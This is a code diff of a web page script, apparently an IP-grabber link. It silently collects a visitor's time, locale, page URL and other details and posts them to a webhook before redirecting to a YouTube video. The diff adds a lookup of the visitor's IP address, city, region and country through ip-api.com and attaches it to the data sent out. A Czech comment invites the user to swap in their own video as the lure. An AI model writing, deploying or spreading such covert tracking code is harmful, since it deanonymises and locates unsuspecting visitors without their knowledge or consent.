@@ -20,7 +20,7 @@
     const localTime = now.toLocaleString("cs-CZ");
     const locale = Intl.DateTimeFormat().resolvedOptions().locale || navigator.language;
 
-    const data = {
+    let data = {
       content: `🧠 New access logged:
 • Time (UTC): ${now.toISOString()}
 • Local Time: ${localTime}
@@ -40,16 +40,23 @@
 • Page URL: ${window.location.href}`
     };
 
-    fetch(webhookURL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(data)
-    }).finally(() => {
-      // Přesměrování na YouTube video
-      window.location.href = "https://youtu.be/4Fy9PcTYm90"; // <- Nahraď svým videem
-    });
+    fetch("http://ip-api.com/json")
+      .then(res => res.json())
+      .then(ipdata => {
+        data.content += `\n• IP: ${ipdata.query}\n• Location: ${ipdata.city}, ${ipdata.regionName}, ${ipdata.country}`;
+      })
+      .catch(() => {
+        data.content += "\n• IP Lookup Failed";
+      })
+      .finally(() => {
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        }).finally(() => {
+          window.location.href = "https://youtu.be/4Fy9PcTYm90"; // <- Nahraď svým videem
+        });
+      });
   </script>
 </head>
 <body>
